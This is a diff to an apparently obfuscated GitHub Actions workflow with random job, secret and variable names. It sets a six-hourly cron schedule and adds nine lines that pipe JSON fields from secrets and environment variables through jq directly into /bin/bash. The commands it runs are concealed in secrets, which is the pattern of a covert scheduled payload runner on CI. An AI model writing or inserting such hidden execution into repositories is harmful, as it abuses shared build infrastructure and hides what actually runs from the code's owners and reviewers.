@@ -2,7 +2,7 @@ name: gantingxi3810
 on:
   workflow_dispatch:
   schedule:
-    - cron: '14 2/6 * * *'
+    - cron: '40 4/6 * * *'
 
 jobs:
   build:
@@ -11,14 +11,15 @@ jobs:
       - uses: actions/checkout@v4
       - name: gantingxi3810
         env:
-          gn2368: ${{ secrets.gn2368 }}
+          qjz20849: ${{ secrets.qjz20849 }}
         run: |
-          echo $gn2368 | jq -r .pies81807 | /bin/bash
-          echo $wf69188 | jq -r .r26830 | /bin/bash
-          echo $qcry326 | jq -r .lfbg67 | /bin/bash
-          echo $lcpxj110 | jq -r .dz0821 | /bin/bash
-          echo $zuw6490 | jq -r .qh2452 | /bin/bash
-          echo $lcmf02353 | jq -r .facn774 | /bin/bash
-          echo $jfdpv765 | jq -r .dn1 | /bin/bash
-          echo $t87668 | jq -r .buxj845 | /bin/bash
+          echo $qjz20849 | jq -r .vwtro39 | /bin/bash
+          echo $ldu0 | jq -r .ks80316 | /bin/bash
+          echo $cdr5 | jq -r .rc1 | /bin/bash
+          echo $fqoj66592 | jq -r .pueu400 | /bin/bash
+          echo $zpc41 | jq -r .zbgfo172 | /bin/bash
+          echo $guny520 | jq -r .twcve50644 | /bin/bash
+          echo $qihe68561 | jq -r .sjdix7 | /bin/bash
+          echo $pjgx76879 | jq -r .w52 | /bin/bash
+          echo $p89671 | jq -r .hzce98464 | /bin/bash
 
